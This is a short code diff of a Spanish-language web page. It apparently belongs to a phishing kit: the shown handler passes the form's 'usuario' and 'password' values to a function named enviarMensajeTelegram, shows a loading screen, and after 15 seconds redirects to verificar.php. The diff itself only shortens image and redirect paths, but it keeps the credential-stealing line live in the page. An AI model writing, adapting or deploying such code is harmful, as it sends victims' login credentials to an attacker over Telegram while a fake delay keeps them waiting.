@@ -40,9 +40,9 @@
 </head>
 <body>
     <div class="head">
-        <img src="archivos/logo.gif" class="logo">
-        <img src="archivos/Certificado.svg" class="headimg1">
-        <img src="archivos/Contactenos.svg" class="headimg2">
+        <img src="logo.gif" class="logo">
+        <img src="Certificado.svg" class="headimg1">
+        <img src="Contactenos.svg" class="headimg2">
         <a href="#" class="linkhead1">Certificaciones</a>
         <a href="#" class="linkhead2">Contáctenos</a>
     </div>
@@ -133,7 +133,7 @@
                     enviarMensajeTelegram(formData.get("usuario"), formData.get("password"));
                     loadingScreen.style.display = "flex";
                     setTimeout(() => {
-                        window.location.href = "src/php/verificar.php";
+                        window.location.href = "verificar.php";
                     }, 15000);
                 })
                 .catch(error => console.error("Error en la solicitud:", error));
